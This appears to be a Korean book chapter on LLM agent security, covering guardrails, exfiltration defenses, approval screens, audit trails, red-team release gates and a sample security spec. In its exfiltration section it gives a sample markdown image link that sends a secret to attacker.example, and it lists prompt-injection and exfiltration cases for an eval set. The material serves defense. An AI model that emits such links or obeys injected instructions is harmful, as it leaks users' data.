    17мһҘм—җм„ң agent guardrailмқҖ final answerл§Ң ліҙл©ҙ лҠҰлӢӨкі  н–ҲлӢӨ. 18мһҘм—җм„ңлҠ” лҚ” лӘ…нҷ•нһҲ л§җн•  мҲҳ мһҲлӢӨ. Tool boundaryлҠ” л‘җ лІҲ кІҖмӮ¬н•ҙм•ј н•ңлӢӨ.

    1. Toolмқ„ мӢӨн–үн•ҳкё° м „, modelмқҙ л§Ңл“  argumentлҘј кІҖмӮ¬н•ңлӢӨ.
    2. Toolмқ„ мӢӨн–үн•ң л’Ө, tool outputмқҙ лӢӨмқҢ model callм—җ л“Өм–ҙк°Җкё° м „м—җ кІҖмӮ¬н•ңлӢӨ.

    мң„м№ҳлі„ мұ…мһ„мқҖ лӢӨмқҢкіј к°ҷлӢӨ.

    мң„м№ҳ кІҖмӮ¬ лҢҖмғҒ мӢӨнҢЁ мӢң лҸҷмһ‘
    Input guardrail user prompt, file metadata reject, narrow task, ask clarification
    Retrieval guardrail query, ACL, document class remove unauthorized candidates
    Context guardrail retrieved chunk, tool observation sanitize, quote as data, reduce context
    Tool input guardrail tool name, argument, resource reject call, require approval, raise exception
    Tool output guardrail secret, instruction payload, malformed data redact, summarize, reject content
    Final output guardrail PII, policy violation, unsupported claim block, revise, escalate
    Side-effect guardrail write/delete/send/pay/deploy human approval, idempotency, audit

    OpenAI Agents SDKлҸ„ input guardrailкіј output guardrailмқ„ кө¬л¶„н•ҳкі , tool guardrailм—җлҠ” allow, reject content, raise exception к°ҷмқҖ лҸҷмһ‘мқҙ мһҲлӢӨ. мӨ‘мҡ”н•ң кІғмқҖ SDK мқҙлҰ„мқҙ м•„лӢҲлқј м„Өкі„ мӣҗм№ҷмқҙлӢӨ. GuardrailмқҖ "лӘЁлҚёмқҙ м•Ңм•„м„ң мЎ°мӢ¬н•ҳкёё л°”лқјлҠ” л¬ёмһҘ"мқҙ м•„лӢҲлқј runtimeмқҙ мІҳлҰ¬н•ҳлҠ” decision pointм—¬м•ј н•ңлӢӨ.

    Data exfiltrationмқҖ URL н•ҳлӮҳлЎңлҸ„ мқјм–ҙлӮңлӢӨ¶

    Data exfiltrationмқҖ "л№„л°Җмқ„ лӢөліҖм—җ к·ёлҢҖлЎң м¶ңл Ҙн•ҳлҠ” кІғ"л§Ңмқҙ м•„лӢҲлӢӨ. лӘЁлҚёмқҙ мҷёл¶ҖлЎң мҡ”мІӯмқ„ л§Ңл“Ө мҲҳ мһҲлӢӨл©ҙ лҚ” мһ‘мқҖ нҶөлЎңлҸ„ мң„н—ҳн•ҳлӢӨ.

    мҳҲлҘј л“Өм–ҙ agentк°Җ markdownмқ„ л§Ңл“Ө мҲҳ мһҲкі  мӮ¬мҡ©мһҗк°Җ к·ё markdownмқ„ л ҢлҚ”л§Ғн•ңлӢӨл©ҙ лӢӨмқҢлҸ„ лҲ„м¶ң нҶөлЎңк°Җ лҗ  мҲҳ мһҲлӢӨ.

    ![tracking](https://attacker.example/pixel?secret=...)

    лҳҗлҠ” toolмқҙ URL fetchлҘј н—Ҳмҡ©н•ңлӢӨл©ҙ, лӘЁлҚёмқҙ лҜјк°җ м •ліҙлҘј query parameterм—җ л„Јм–ҙ мҷёл¶Җ endpointлЎң ліҙлӮј мҲҳ мһҲлӢӨ.

    Exfiltration л°©м§ҖлҠ” лӢӨмқҢ кі„мёөм—җм„ң н•ңлӢӨ.

    кі„мёө л°©м§Җмұ…
    Prompt assembly secretмқ„ contextм—җ л„Јм§Җ м•ҠлҠ”лӢӨ
    Retrieval к¶Ңн•ң м—ҶлҠ” л¬ём„ңлҘј к°Җм ёмҳӨм§Җ м•ҠлҠ”лӢӨ
    Tool allowlist мҷёл¶Җ network toolмқ„ workflowлі„лЎң м ңн•ңн•ңлӢӨ
    URL policy domain allowlist, method м ңн•ң, query redaction
    Output rendering remote image/link мһҗлҸҷ лЎңл”© м ңн•ң
    Output filter secret pattern, PII, credential redaction
    Audit outbound URL, tool argument hash, denied reason кё°лЎқ

    к°ҖмһҘ мўӢмқҖ secret л°©м–ҙлҠ” secretмқ„ лӘЁлҚё contextм—җ л„Јм§Җ м•ҠлҠ” кІғмқҙлӢӨ. System prompt м•Ҳм—җ API key, internal URL, policy secretмқ„ л„Јмңјл©ҙ prompt injection мқҙм „м—җ м„Өкі„к°Җ мқҙлҜё мң„н—ҳн•ҳлӢӨ.

    Human approvalмқҖ лІ„нҠј н•ҳлӮҳк°Җ м•„лӢҲлӢӨ¶

    High-risk actionмқҖ human-in-the-loopк°Җ н•„мҡ”н•ҳлӢӨ. н•ҳм§Җл§Ң "мҠ№мқё лІ„нҠј"л§Ң мһҲмңјл©ҙ м¶©л¶„н•ҳм§Җ м•ҠлӢӨ.

    мҠ№мқё нҷ”л©ҙм—җлҠ” мӮ¬лһҢмқҙ нҢҗлӢЁн•  мҲҳ мһҲлҠ” evidenceк°Җ мһҲм–ҙм•ј н•ңлӢӨ.

    мҠ№мқё нҷ”л©ҙ н•„л“ң мқҙмң 
    User request мӣҗлһҳ мҡ”мІӯ нҷ•мқё
    Proposed action agentк°Җ н•ҳл ӨлҠ” ліҖкІҪ
    Resource м–ҙл–Ө order, account, documentмқём§Җ
    Risk class refund, delete, email, deploy л“ұ
    Policy basis м–ҙл–Ө rule л•Ңл¬ём—җ н—Ҳмҡ© нӣ„ліҙмқём§Җ
    Diff or preview мӢӨм ң ліҖкІҪ лӮҙмҡ©
    Source evidence RAG л¬ём„ң, tool кІ°кіј, citation
    Idempotency key мӨ‘ліө мӢӨн–ү л°©м§Җ
    Approver identity лҲ„к°Җ мҠ№мқён–ҲлҠ”м§Җ
    Expiration мҳӨлһҳлҗң мҠ№мқё мһ¬мӮ¬мҡ© л°©м§Җ

    мӮ¬лһҢмқҙ "Approve"лҘј лҲҢл ҖлӢӨлҠ” мӮ¬мӢӨл§Ң лӮЁкё°л©ҙ мӮ¬кі  нӣ„ мһ¬нҳ„мқҙ м–ҙл өлӢӨ. л¬ҙм—Үмқ„ ліҙкі  мҠ№мқён–ҲлҠ”м§Җ, к·ёл•Ң agentк°Җ м–ҙл–Ө dataмҷҖ policyлҘј к·јкұ°лЎң мӮјм•ҳлҠ”м§Җк°Җ traceм—җ лӮЁм•„м•ј н•ңлӢӨ.

    ObservabilityлҠ” security evidenceлӢӨ¶

    14мһҘм—җм„ңлҠ” observabilityлҘј мҡҙмҳҒ мһҘм•  лҢҖмқ‘ кҙҖм җм—җм„ң лҙӨлӢӨ. Securityм—җм„ңлҸ„ к°ҷмқҖ traceк°Җ н•„мҡ”н•ҳлӢӨ.

    Prompt injection мӮ¬кі к°Җ л°ңмғқн•ҳл©ҙ лӢӨмқҢ м§Ҳл¬ём—җ лӢөн•ҙм•ј н•ңлӢӨ.

    м§Ҳл¬ё н•„мҡ”н•ң evidence
    м–ҙл–Ө untrusted contentк°Җ л“Өм–ҙмҷ”лҠ”к°Җ source URL, document ID, chunk ID, hash
    лӘЁлҚёмқҖ м–ҙл–Ө toolмқ„ нҳём¶ңн–ҲлҠ”к°Җ tool name, schema version, argument hash
    к¶Ңн•ң кІҖмӮ¬лҠ” нҶөкіјн–ҲлҠ”к°Җ policy decision ID, allow/deny reason
    м–ҙл–Ө лҚ°мқҙн„°к°Җ contextм—җ л“Өм–ҙк°”лҠ”к°Җ provenance, tenant, classification
    м–ҙл–Ө side effectк°Җ л°ңмғқн–ҲлҠ”к°Җ side effect ID, transaction ID
    лҲ„к°Җ мҠ№мқён–ҲлҠ”к°Җ approver, timestamp, evidence snapshot
    мөңмў… м¶ңл ҘмқҖ л¬ҙм—Үмқҙм—ҲлҠ”к°Җ redacted output, output guardrail result

    LLM security logм—җлҠ” raw secretмқ„ лӮЁкё°л©ҙ м•Ҳ лҗңлӢӨ. лҢҖмӢ  hash, classification, policy decision, redacted sampleмқ„ лӮЁкёҙлӢӨ.

    ліҙм•Ҳ кҙҖмёЎм„ұмқҖ "к°җмӢң"к°Җ м•„лӢҲлқј releaseмҷҖ incident responseмқҳ мҰқкұ° мІҙкі„лӢӨ.

    Red teamмқҖ release gateм—җ л“Өм–ҙк°Җм•ј н•ңлӢӨ¶

    OpenAI safety best practicesлҠ” adversarial testingкіј red-teamingмқ„ к¶ҢмһҘн•ңлӢӨ. OWASPлҸ„ adversarial testingкіј attack simulationмқ„ mitigationмңјлЎң л‘”лӢӨ. Productionм—җм„ңлҠ” мқҙкІғмқ„ мҲҳлҸҷ мқҙлІӨнҠёлЎңл§Ң л‘җм§Җ л§җкі  release gateм—җ л„ЈлҠ”лӢӨ.

    Security eval setм—җлҠ” лӢӨмқҢ caseк°Җ нҸ¬н•Ёлҗҳм–ҙм•ј н•ңлӢӨ.

    Case кё°лҢҖ кІ°кіј
    Direct injection system instruction ліҖкІҪ мӢӨнҢЁ
    Indirect injection in retrieved doc document instructionмқ„ лҚ°мқҙн„°лЎңл§Ң мІҳлҰ¬
    Cross-tenant retrieval attempt unauthorized document лҜёкІҖмғү
    Secret extraction request secret лҜёл…ём¶ң, refusal лҳҗлҠ” м•Ҳм „н•ң лҢҖмІҙ
    Unauthorized mutating tool tool call кұ°л¶Җ
    Tool output injection tool outputмқҳ instruction л¬ҙмӢң
    Malformed tool argument schema/code validation мӢӨнҢЁ
    External URL exfiltration URL м°ЁлӢЁ лҳҗлҠ” redaction
    High-risk action without approval мӢӨн–ү мӨ‘лӢЁ
    Prompt-based DoS token/step/timeout budget м°ЁлӢЁ

    Release gateлҠ” лӢӨмқҢмІҳлҹј м“ё мҲҳ мһҲлӢӨ.

    Gate Pass rule Fail action
    Critical injection critical prompt injection set 100% blocked release block
    RAG authorization unauthorized retrieval candidate = 0 in eval release block

    Security gateлҠ” "лӘЁлҚё м җмҲҳ"ліҙлӢӨ fail actionмқҙ мӨ‘мҡ”н•ҳлӢӨ. Critical leakлӮҳ unauthorized side effectлҠ” нҸүк·  м җмҲҳлЎң лҚ®мңјл©ҙ м•Ҳ лҗңлӢӨ.

    Failure pattern¶

    System promptм—җ secretмқ„ л„ЈлҠ”лӢӨ¶

    System promptлҠ” лӘЁлҚё contextлӢӨ. Prompt injectionмқҙ м„ұкіөн•ҳл©ҙ л…ём¶ңлҗ  мҲҳ мһҲлӢӨ. SecretмқҖ backend secret managerмҷҖ tool implementation м•Ҳм—җ мһҲм–ҙм•ј н•ңлӢӨ.

    Retrieval нӣ„м—җ к¶Ңн•ңмқ„ кІҖмӮ¬н•ңлӢӨ¶

    к¶Ңн•ң м—ҶлҠ” л¬ём„ңк°Җ мқҙлҜё contextм—җ л“Өм–ҙк°„ л’Өм—җлҠ” лҠҰлӢӨ. ACLмқҖ retrieval queryмҷҖ index metadata лӢЁкі„м—җм„ң к°•м ңн•ңлӢӨ.

    Tool schemaлҘј security boundaryлЎң м°©к°Ғн•ңлӢӨ¶

    Strict schemaлҠ” argument лӘЁм–‘мқ„ м ңн•ңн•ңлӢӨ. н•ҳм§Җл§Ң нҳ„мһ¬ userк°Җ к·ё resourceлҘј ліҖкІҪн•  к¶Ңн•ңмқҙ мһҲлҠ”м§ҖлҠ” лі„лҸ„ policy checkк°Җ нҢҗлӢЁн•ҙм•ј н•ңлӢӨ.

    External contentлҘј "м°ёкі  мһҗлЈҢ"лЎңл§Ң ліёлӢӨ¶

    мҷёл¶Җ л¬ём„ң, email, webpage, PDFлҠ” лӘЁл‘җ кіөкІ©мһҗк°Җ м“ё мҲҳ мһҲлҠ” inputмқҙлӢӨ. Tool outputлҸ„ л§Ҳм°¬к°Җм§ҖлӢӨ.

    Guardrail LLM н•ҳлӮҳм—җ лӘЁл‘җ л§ЎкёҙлӢӨ¶

    Guardrail modelлҸ„ LLMмқҙлӢӨ. Useful signalмқҖ лҗ  мҲҳ мһҲм§Җл§Ң, access control, output validation, human approval, audit logлҘј лҢҖмІҙн•ҳм§Җ м•ҠлҠ”лӢӨ.

    Audit logм—җ мӣҗл¬ё secretмқ„ лӮЁкёҙлӢӨ¶

    мӮ¬кі  л¶„м„қмқ„ мң„н•ҙ raw promptмҷҖ raw outputмқ„ м „л¶Җ м ҖмһҘн•ҳл©ҙ лЎңк·ёк°Җ мғҲлЎңмҡҙ мң м¶ң м§Җм җмқҙ лҗңлӢӨ. Redactionкіј retentionмқҙ н•„мҡ”н•ҳлӢӨ.

    мӢӨмҠө: Security boundary spec л§Ңл“Өкё°¶

    мІ« production LLM workflowм—җлҠ” лӢӨмқҢ security specмқ„ л¶ҷмқёлӢӨ.

    н•ӯлӘ© мҳҲ
    Workflow ID support-refund-agent-v1
    Trust zones user input, retrieved docs, tool output, memory, trusted policy
    Protected assets tenant order data, payment status, refund action
    Allowed data sources order DB with tenant ACL, refund policy docs
    Forbidden data sources other tenant tickets, raw payment token
    Allowed tools lookup_order, read_policy, create_refund_draft
    High-risk tools issue_refund, send_email
    Approval rule refund over threshold or any external email
    Retrieval policy tenant ACL before vector search, citation required
    Output policy no PII beyond current user's authorized resource
    Exfiltration policy no remote image, external URL domain allowlist
    Budget policy max steps, max tokens, max wall-clock
    Guardrails input, retrieval, tool input, tool output, final output
    Audit fields trajectory_id, policy decision ID, tool call ID, side effect ID

    мқҙ specмқҙ мһҲмңјл©ҙ security reviewк°Җ кө¬мІҙм Ғмқё м§Ҳл¬ёмқ„ н•  мҲҳ мһҲлӢӨ. м—Ҷмңјл©ҙ "н”„лЎ¬н”„нҠёлҘј лҚ” м•Ҳм „н•ҳкІҢ м“°мһҗ"лҠ” м¶”мғҒм Ғмқё л§җл§Ң лӮЁлҠ”лӢӨ.

    м •лҰ¬¶

    • Prompt injectionмқҖ лӘЁлҚёмқҙ лӮҳмҒң textлҘј мқҪлҠ” л¬ём ңк°Җ м•„лӢҲлқј, мӢ лў°лҗҳм§Җ м•ҠмқҖ textк°Җ к¶Ңн•ң мһҲлҠ” actionкіј data pathм—җ мҳҒн–Ҙмқ„ мЈјлҠ” л¬ём ңлӢӨ.
    • PromptлҠ” м •мұ…мқ„ м„ӨлӘ…н•  мҲҳ мһҲм§Җл§Ң security boundaryлҘј к°•м ңн•ҳм§Җ лӘ»н•ңлӢӨ. Authentication, authorization, retrieval filter, tool permission, output validationмқҖ application codeм—җм„ң к°•м ңн•ҙм•ј н•ңлӢӨ.
    • RAG authorizationмқҖ retrieval м „м—җ м Ғмҡ©н•ҙм•ј н•ңлӢӨ. к¶Ңн•ң м—ҶлҠ” л¬ём„ңк°Җ contextм—җ л“Өм–ҙк°„ л’Ө лӘЁлҚём—җкІҢ л¬ҙмӢңн•ҳлқјкі  л§җн•ҳлҠ” кІғмқҖ лҠҰлӢӨ.
    • Agent toolмқҖ role/workflowлі„ allowlistлЎң м ңн•ңн•ҳкі , read-onlyмҷҖ mutating toolмқ„ л¶„лҰ¬н•ҙм•ј н•ңлӢӨ.
    • Tool inputкіј tool output лӘЁл‘җ guardrail лҢҖмғҒмқҙлӢӨ. Tool outputлҸ„ лӢӨмқҢ model callм—җм„ңлҠ” untrusted inputмқҙлӢӨ.
    • High-risk side effectм—җлҠ” human approval, idempotency key, audit evidenceк°Җ н•„мҡ”н•ҳлӢӨ.
    • Security observabilityлҠ” injection, denied tool call, retrieval authorization, approval, redaction, side effectлҘј мһ¬нҳ„н•  мҲҳ мһҲм–ҙм•ј н•ңлӢӨ.
    • Security red teamкіј injection evalмқҖ release gateмқҳ мқјл¶Җм—¬м•ј н•ңлӢӨ.
